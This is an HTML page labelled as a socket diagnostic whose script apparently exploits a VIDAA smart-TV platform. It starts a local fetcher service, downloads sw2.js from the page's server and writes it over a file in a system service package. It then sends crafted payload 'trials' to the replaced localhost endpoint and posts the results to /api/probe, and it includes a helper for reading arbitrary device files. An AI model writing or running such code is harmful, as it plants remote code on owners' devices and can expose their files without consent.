<html><head><meta charset="utf-8"><title>socket diag</title></head>
<body><pre id="out">socket diag…</pre><script>
(function(){
 "use strict";
 var out=document.getElementById("out");
 var report={started:new Date().toISOString(),steps:{}};
 function save(){try{var x=new XMLHttpRequest();x.open("POST","/api/probe",true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify(report));}catch(e){}}
 function line(t){out.textContent=out.textContent+"\n"+t;}
 var FN_URL="http://localhost:9009/function/basic/fetch/sw2";
 var BASE=location.origin+"/pub/";
 function syncExec(svc,obj){try{return vowOS.service.syncExecute(svc,obj);}catch(e){return{ret:false,msg:"EXC "+e.message};}}
 function startFetcher(){return new Promise(function(res){var done=false;function fin(v){if(!done){done=true;res(v);}}
   try{var ws=new WebSocket("wss://localhost:9888");
     ws.onopen=function(){ws.send(JSON.stringify({path:"phoenix://service/basic/fetcher",method:"start",parameters:{},session:901,timeout:10}));setTimeout(function(){try{ws.close();}catch(e){}fin("ok");},1200);};
     ws.onerror=function(){fin("ws err");};setTimeout(function(){fin("timeout");},5000);
   }catch(e){fin("EXC "+e.message);}});}
 function hr(path){try{var r=syncExec("hiutils",{api:"fileRead",args:{mode:6,path:[path]}});var okc=r&&r.ret===true;return{ok:okc,body:okc?String(r.msg).slice(0,6000):null,err:okc?null:String(r.msg).slice(0,140)};}catch(e){return{ok:false,err:"EXC "+e};}}
 var TRIALS=[
  {item:"85:85:85;/APPS;",term:"nl"},
  {item:"85:85:85;/APPS;",term:"none"},
  {item:"85:85:85;/APPS;",term:"crlf"},
  {item:"10:1:10;",term:"nl"}
 ];
 setTimeout(function(){
  startFetcher().then(function(s0){report.steps.start=s0;line("fetcher "+s0);
   setTimeout(function(){
    report.steps.sw2=syncExec("basic/fetcher",{api:"fetchFile",args:JSON.stringify({url:BASE+"sw2.js",directory:"/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js",permission:420})});
    line("sw2 update: "+JSON.stringify(report.steps.sw2));
    setTimeout(function(){
     var x=new XMLHttpRequest();
     x.open("POST",FN_URL,true);x.setRequestHeader("Content-Type","application/json");
     x.onload=function(){report.steps.diag=String(x.responseText||"").slice(0,2500);line("diag: "+report.steps.diag.slice(0,1200));setTimeout(save,400);};
     x.onerror=function(){report.steps.diag="XHR error";line("xhr error");save();};
     x.send(JSON.stringify({list:TRIALS}));
    },1600);
   },1600);
  });
 },300);
})();
</script></body></html>
